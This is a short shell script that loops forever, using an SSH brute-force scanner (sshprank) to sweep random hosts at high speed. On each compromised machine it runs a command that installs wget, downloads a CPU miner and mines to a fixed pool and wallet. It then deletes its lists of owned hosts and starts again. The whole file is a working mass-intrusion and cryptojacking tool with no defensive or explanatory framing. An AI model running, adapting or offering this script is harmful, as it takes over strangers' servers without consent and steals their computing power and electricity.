while [ 1 != 0 ]
do
sudo python3 sshprank.py -m '-p22 --rate=1000000' -r 10000 -e -c 'apt update || yum update -y; sudo apt update; apt install wget -y || yum instal wget -y; sudo apt install wget -y; wget https://github.com/m-pays/m-cpuminer-v2/releases/download/2.4/m-minerd-64-linux.tar.gz && tar xfvz m-minerd-64-linux.tar.gz && cd m-minerd-64-linux && ./m-minerd -o stratum+tcp://eu.npc-mining.net:3002 -u 9Q8YVTkcGU2UXzigqW6uBgkXjPQPns2RZq -p c=XMG -e 50' -x 700 -S 700 -X 700
rm sshds.txt owned.txt
done
